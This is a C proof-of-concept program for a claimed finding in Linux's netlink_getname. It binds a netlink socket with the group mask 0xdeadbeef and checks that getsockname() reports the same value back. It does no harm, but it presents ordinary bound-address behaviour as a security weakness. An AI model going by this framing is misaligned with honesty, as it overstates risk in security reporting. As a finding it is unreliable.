/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ netlink_getname (af_netlink.c:1157)
 *
 * Reach path: getsockname() -> sock->ops->getname() -> netlink_getname()
 * line 1157:  nladdr->nl_groups = nlk->groups ? nlk->groups[0] : 0;
 *
 * The groups[0] value was set by userspace during bind() — attacker-
 * determined content is returned by the authoritative getsockname().
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

int main(void)
{
    int fd, ret = 1;
    struct sockaddr_nl baddr, name;
    socklen_t alen;

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
    if (fd < 0) { perror("socket"); return 1; }

    /* Attacker-chosen nl_groups */
    memset(&baddr, 0, sizeof(baddr));
    baddr.nl_family = AF_NETLINK;
    baddr.nl_groups = 0xdeadbeef;

    if (bind(fd, (struct sockaddr *)&baddr, sizeof(baddr)) < 0) {
        perror("bind"); close(fd); return 1;
    }

    /* getsockname -> netlink_getname line 1157 */
    memset(&name, 0, sizeof(name));
    alen = sizeof(name);
    if (getsockname(fd, (struct sockaddr *)&name, &alen) < 0) {
        perror("getsockname"); close(fd); return 1;
    }

    if (name.nl_groups == 0xdeadbeef) {
        printf("POC: getsockname.nl_groups=0x%x == bound 0xdeadbeef\n",
               name.nl_groups);
        ret = 0;
    } else {
        printf("POC: getsockname.nl_groups=0x%x != 0xdeadbeef\n",
               name.nl_groups);
    }

    close(fd);
    return ret;
}
